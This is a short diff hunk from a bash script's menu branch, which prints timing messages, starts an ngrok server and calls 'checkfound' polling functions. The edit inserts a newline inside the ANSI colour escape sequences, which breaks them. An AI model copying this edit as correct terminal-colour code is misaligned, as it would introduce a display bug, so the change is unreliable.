@@ -415,12 +415,12 @@ start4
 elif [[ $option_server -eq 2 ]]; then
 
 	if [[ $option == 1 || $option == 01 ]]; then
-		printf "\e[1;92m 0.5 sec\e\n"
+		printf "\e\n[1;92m 0.5 sec\e\n"
 		ngrok_server1
 		checkfound5
 	
 	elif [[ $option == 2 || $option == 02 ]]; then
-		printf "\e[1;92m 0.10 sec\e\n"
+		printf "\e\n[1;92m 0.10 sec\e\n"
 		ngrok_server1
 		checkfound10
 
